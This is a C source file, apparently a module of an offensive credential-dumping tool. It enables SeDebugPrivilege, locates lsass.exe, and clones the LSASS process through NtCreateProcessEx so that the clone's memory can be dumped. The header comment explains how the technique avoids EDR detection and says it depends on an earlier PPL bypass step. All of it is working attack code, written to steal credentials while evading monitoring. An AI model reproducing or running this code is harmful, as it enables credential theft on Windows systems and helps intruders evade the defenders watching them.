/*
 * process_clone.c — clone LSASS via NtCreateProcessEx, dump the clone.
 *
 * Why clone:
 *   - LSASS is heavily monitored. Opening it with PROCESS_VM_READ +
 *     PROCESS_QUERY_INFORMATION pings every EDR.
 *   - NtCreateProcessEx with SectionHandle=NULL and ParentProcess=hLsass
 *     forks a process whose VAD tree is the same as LSASS but with a
 *     different PID. We dump the clone, the original is untouched.
 *   - The clone has the LSASS handle's protection level, so it must be
 *     started AFTER our PPL bypass step (otherwise OpenProcess on LSASS
 *     to obtain the parent handle still fails).
 *
 * Returns a handle to the cloned process, or NULL on failure.
 */
#include "common.h"

static pNtCreateProcessEx     pNtCreateProcessEx_;
static pRtlInitUnicodeString  pRtlInitUS_;

static BOOL load_ntdll_sym(void) {
    if (pNtCreateProcessEx_) return TRUE;
    HMODULE n = GetModuleHandleA("ntdll.dll");
    if (!n) { ERR("GetModuleHandle(ntdll)"); return FALSE; }
    pNtCreateProcessEx_ = (pNtCreateProcessEx)GetProcAddress(n, "NtCreateProcessEx");
    pRtlInitUS_         = (pRtlInitUnicodeString)GetProcAddress(n, "RtlInitUnicodeString");
    if (!pNtCreateProcessEx_ || !pRtlInitUS_) {
        ERR("GetProcAddress(NtCreateProcessEx/RtlInitUnicodeString)");
        return FALSE;
    }
    return TRUE;
}

BOOL pc_enable_se_debug(void) {
    HANDLE hTok;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) {
        ERR("OpenProcessToken err=%lu", GetLastError());
        return FALSE;
    }
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        ERR("LookupPrivilegeValue(SeDebugPrivilege) err=%lu", GetLastError());
        CloseHandle(hTok); return FALSE;
    }
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        ERR("AdjustTokenPrivileges err=%lu", GetLastError());
        CloseHandle(hTok); return FALSE;
    }
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        ERR("SeDebugPrivilege not assigned (need elevated)");
        CloseHandle(hTok); return FALSE;
    }
    CloseHandle(hTok);
    LOG("SeDebugPrivilege enabled");
    return TRUE;
}

static DWORD find_pid_by_name(const char *name) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    DWORD found = 0;
    wchar_t wname[260] = {0};
    MultiByteToWideChar(CP_UTF8, 0, name, -1, wname, 260);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, wname) == 0) {
                found = pe.th32ProcessID; break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

HANDLE pc_clone_lsass(void) {
    if (!load_ntdll_sym()) return NULL;

    DWORD lsass = find_pid_by_name("lsass.exe");
    if (!lsass) { ERR("lsass.exe not found in toolhelp snapshot"); return NULL; }
    LOG("lsass.exe pid = %lu", lsass);

    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, lsass);
    if (!hParent) {
        ERR("OpenProcess(lsass, PROCESS_CREATE_PROCESS) err=%lu (PPL still on?)",
            GetLastError());
        return NULL;
    }

    HANDLE hClone = NULL;
    NTSTATUS st = pNtCreateProcessEx_(
        &hClone,
        PROCESS_ALL_ACCESS,
        NULL,                 /* ObjectAttributes */
        hParent,              /* ParentProcess = LSASS */
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        NULL, NULL, NULL, 0);
    CloseHandle(hParent);
    if (!NT_SUCCESS(st) || !hClone) {
        ERR("NtCreateProcessEx st=0x%lx", st);
        return NULL;
    }
    LOG("LSASS clone created — handle=%p", hClone);
    return hClone;
}
